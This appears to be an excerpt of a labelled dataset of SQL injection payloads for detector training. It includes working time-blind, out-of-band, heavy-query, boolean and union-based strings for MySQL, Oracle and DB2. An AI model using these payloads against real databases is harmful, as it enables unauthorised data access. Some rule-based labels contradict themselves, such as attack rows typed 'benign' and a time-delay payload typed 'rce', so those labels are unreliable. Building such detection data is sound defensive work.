row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2599,1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 5171 = 5171,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2600,-7962' ) ) as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
2601,"1"" ) ) as sgln where 7573 = 7573",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2602,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""gjtx"" like ""gjtx",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2603,"1"" and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""bzzt"" like ""bzzt",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
2604,"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""vnei"" like ""vnei",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
2605,"1 ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2606,"1"" ) ) as puws where 7006 = 7006",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2607,"1"" and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
2608,"select sleep ( 5 ) and ( ""zsjw"" like ""zsjw",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2609,"-7485"" ) ) as caob where 4100 = 4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
